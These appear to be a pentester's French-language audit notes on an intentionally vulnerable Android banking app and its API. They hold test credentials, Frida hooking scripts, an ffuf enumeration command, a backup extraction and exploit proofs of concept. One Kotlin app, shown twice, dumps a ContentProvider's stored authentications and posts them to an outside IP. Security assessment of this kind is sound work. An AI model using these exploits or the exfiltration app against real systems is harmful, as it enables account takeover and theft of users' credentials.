

```
API:
3.64.133.246

Creds:
JackBlack / XmcoAudit2020!
test / test
test / @Test1234
devadmin / test
devadmin / test1234

Compte banquaire:
JackBlack: 54000
test: 100000

```

![[IMG-20260603160340869.png]]


![[IMG-20260603160342261.png]]

```
frida --codeshare akabe1/frida-multiple-unpinning -f com.android.xmcodroidbank -U
```

```
frida-ps -Uai | grep -i xmcodroid
frida -U -p <pid> -l anti-npe-asynctask.js
```

```java
Java.perform(function () {

var classes = [
"com.android.xmcodroidbank.DoTransfer$RequestDoGets2",
"com.android.xmcodroidbank.ChangePassword$RequestChangePasswordTask"
];

classes.forEach(function (cls) {
  
try {
  
var Target = Java.use(cls);
  
Target.doInBackground.overloads.forEach(function (ovl) {
  
ovl.implementation = function () {
try {
  
return ovl.apply(this, arguments); 

} catch (e) {
  
console.log("[!] Prevented crash in " + cls);
console.log("[!] Exception: " + e);
var retType = ovl.returnType.type;  

if (retType === "boolean") return false;
if (retType === "int") return 0;
if (retType === "void") return;
return null;
  
}
  
};
  
});
  
console.log("[+] Hook installed on " + cls); 

} catch (e) {
  
console.log("[-] Class not found: " + cls);
  
}
  
});
  
});
```


```
apktool d xmco.apk
jadx-gui xmco.apk &
```

![[IMG-20260603160344801.png]]

![[IMG-20260603160346073.png]]


```
Account:
5555555555554444
371449635398431
```

## Pentest API

### Modification de l'émetteur d'un virement (ACL)
```
password=@Test1234&amount=41000&to_acc=5555555555554444&from_acc=371449635398431&label=Shopping&username=test
```

![[IMG-20260603160347842.png]]

Condition:
Le compte associé au champ `password/username` doit être diffénrent du compte associé à l'id dans le champ `to_acc`. Sinon:
![[IMG-20260603160349150.png]]

### Changement du mdp d'un autre compte que le sien (ACL)

![[IMG-20260603160350979.png]]

![[IMG-20260603160353202.png]]


### Le compte admin:admin existe

![[IMG-20260603160354579.png]]

### Mauvaise Gestion des erreurs dans la requête login

![[IMG-20260603160355511.png]]
![[IMG-20260603160356260.png]]


![[IMG-20260603160358060.png]]
```
ffuf -w /Users/tdutrey/Documents/tools/Wordlist/SecLists/Usernames/top-usernames-shortlist.txt \
-u https://3.64.133.246/login \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "password=@Test1234&username=FUZZ" \
-fr '"account_number": null' \
-k
```

#### IDOR Champ account (ACL)

![[IMG-20260603160359049.png]]

### Transaction inversé dans le cham "amount"

![[IMG-20260603160359967.png]]

## Pentest APK


#### Trop de permission sont données à l'app

![[IMG-20260603160401400.png]]

![[IMG-20260603160401475.png]]

```java
package com.example.auditxmco  
  
import android.net.Uri  
import android.os.Bundle  
import androidx.activity.ComponentActivity  
import java.net.HttpURLConnection  
import java.net.URL  
  
class MainActivity : ComponentActivity() {  
    override fun onCreate(savedInstanceState: Bundle?) {  
        super.onCreate(savedInstanceState)  
  
        val uri = Uri.parse(  
            "content://com.android.xmcodroidbank.TrackUserContentProvider/trackerusers"  
        )  
  
        val cursor = contentResolver.query(uri, null, null, null, null)  
        val data = StringBuilder()  
  
        cursor?.use {  
            while (it.moveToNext()) {  
                data.append(it.getString(1)).append("\n")  
            }  
        }  
  
        Thread {  
            try {  
                val conn = URL("http://212.129.9.19:5555")  
                    .openConnection() as HttpURLConnection  
  
                conn.requestMethod = "POST"  
                conn.doOutput = true  
  
                conn.outputStream.use { os ->  
                    os.write(data.toString().toByteArray())  
                }  
  
                conn.responseCode // trigger request  
  
            } catch (_: Exception) {}  
        }.start()  
  
        finish()  
    }  
}
```

![[IMG-20260603160402070.png]]

![[IMG-20260603160402602.png]]

### Compte Hard codé dans l'app (DoLogin)

```
if (DoLogin.this.username.equals("devadmin") || (DoLogin.this.username.equals("test") && DoLogin.this.password.equals("test")))
```

![[IMG-20260603160403778.png]]


### Clé Hard Codé dans l app (CryptoClass)

![[IMG-20260603160404284.png]]

### Mdps stockés en base 64 dans la BDD (DoLogin)
![[IMG-20260603160404797.png]]

![[IMG-20260603160405382.png]]


### Fuite du nouveau mot de passe via broadcast implicite

![[IMG-20260603160405580.png]]

Le mot de passe est envoyé dans un **broadcast implicite** avec une action custom.  
Si une autre app peut écouter cette action, elle peut intercepter :
- le numéro de téléphone,
- le nouveau mot de passe.

### Fonctionnalité admin caché dans le front de l'application

![[IMG-20260603160406199.png]]

On peut afficher la page avec frida de cette facon:

```js
Java.perform(function () {
    var Resources = Java.use("android.content.res.Resources");
    Resources.getString.overload('int').implementation = function (id) {
        var result = this.getString(id);
        if (result === "no") {
            console.log("[+] Replacing is_admin value");
            return "yes";
        }
        return result;
    };
});
```

![[IMG-20260603160406793.png]]

![[IMG-20260603160406982.png]]

Puis il y a pas de controle de l'utilisateur:
![[IMG-20260603160407600.png]]

```
package com.example.auditxmco  
  
import android.net.Uri  
import android.os.Bundle  
import androidx.activity.ComponentActivity  
import java.net.HttpURLConnection  
import java.net.URL  
  
class MainActivity : ComponentActivity() {  
    override fun onCreate(savedInstanceState: Bundle?) {  
        super.onCreate(savedInstanceState)  
  
        val uri = Uri.parse(  
            "content://com.android.xmcodroidbank.TrackUserContentProvider/trackerusers"  
        )  
  
        val cursor = contentResolver.query(uri, null, null, null, null)  
        val data = StringBuilder()  
  
        cursor?.use {  
            while (it.moveToNext()) {  
                data.append(it.getString(1)).append("\n")  
            }  
        }  
  
        Thread {  
            try {  
                val conn = URL("http://212.129.9.19:5555")  
                    .openConnection() as HttpURLConnection  
  
                conn.requestMethod = "POST"  
                conn.doOutput = true  
  
                conn.outputStream.use { os ->  
                    os.write(data.toString().toByteArray())  
                }  
  
                conn.responseCode // trigger request  
  
            } catch (_: Exception) {}  
        }.start()  
  
        finish()  
    }  
}
```


```
BroadcastReceiver Manipulation Fait

ContentProvider qui garde toutes les authentifications Fait 

Dump Mémoire du processus Fait  

Intent Sniffing 

Local Storage avec DB sqlite non chiffrée Fait 

Logs verbeux Fait 

XSS Mobile Fait 

Android allowBackup Fait 

Android debuggable Fait 

Solutions de chiffrement faibles Fait 

Manipulation de la chaine `is_admin` Fait 
```

BroadcastReceiver Manipulation evoqué à la fin du rapport mais difficile de faire un POC car ça se fait via l'envoie d'un SMS, sinon ça reprend exactement le même concept de vuln que ContentProvider expliqué à la fin. Est ce que une note suffit pour cette vuln?

Android debuggable et backup -> scénario de compromission compliqué 
Scénario imagineé:
- Soit l'attaquant vol le téléphone de la victime et accès au fichier de l app ou fait un backup et se l'envoi
- Soit l'attaquant à le contôle du pc de la victime et fait du social engenring 

Solution de chiffrement faible évoquué dans la première vuln mobile avec la clé AES, faut il en faire une vuln a part ?

Manipulation de la chaine is_admin est évoqué dans la vuln ACL de l'API, faut il la séparé et en faire une a part aussi ?

## ADB debbugable 

![[IMG-20260603160408178.png]]


## ADB backup

![[IMG-20260603160408740.png]]

![[IMG-20260603160409315.png]]

![[IMG-20260603160409713.png]]

![[IMG-20260603160410099.png]]

![[IMG-20260603160410746.png]]

```
dd if=backup.ab bs=24 skip=1 | python3 -c "import sys, zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > backup.tar
```

```
mkdir backup_extract
tar -xvf backup.tar -C backup_extract
cd backup_extract
```

![[IMG-20260603160411342.png]]

## XSS strored

![[IMG-20260603160411715.png]]

![[IMG-20260603160412200.png]]

![[IMG-20260603160412766.png]]

## Logs verbeux

![[IMG-20260603160413096.png]]

## Local Storage avec DB sqlite non chiffrée 

![[IMG-20260603160413214.png]]

## Solutions de chiffrement faibles

![[IMG-20260603160413590.png]]

![[IMG-20260603160413917.png]]

![[IMG-20260603160414241.png]]

![[IMG-20260603160414283.png]]


## BroadcastReceiver Manipulation

App externe qui appel l'Intent exposé et envoi le message:
```
package com.example.auditxmco  
  
import android.content.Intent  
import android.os.Bundle  
import androidx.activity.ComponentActivity  
  
class MainActivity : ComponentActivity() {  
  
    override fun onCreate(savedInstanceState: Bundle?) {  
        super.onCreate(savedInstanceState)  
  
        val intent = Intent()  
  
        intent.setClassName(  
            "com.android.xmcodroidbank",  
            "com.android.xmcodroidbank.XMCOBroadCastReceiver"  
        )  
  
        intent.putExtra("phonenumber", "078158585858")  
        intent.putExtra("newpass", "XMCO")  
  
        sendBroadcast(intent)  
  
        finish()  
    }  
}
```

![[IMG-20260603160414359.png]]

## Dump Mémoire du processus

![[IMG-20260603160414550.png]]

![[IMG-20260603160415329.png]]

Local Storage avec DB sqlite non chiffrée inclusion dans V2 Fait

XSS Mobile

Logs verbeux

Shared preferences Fait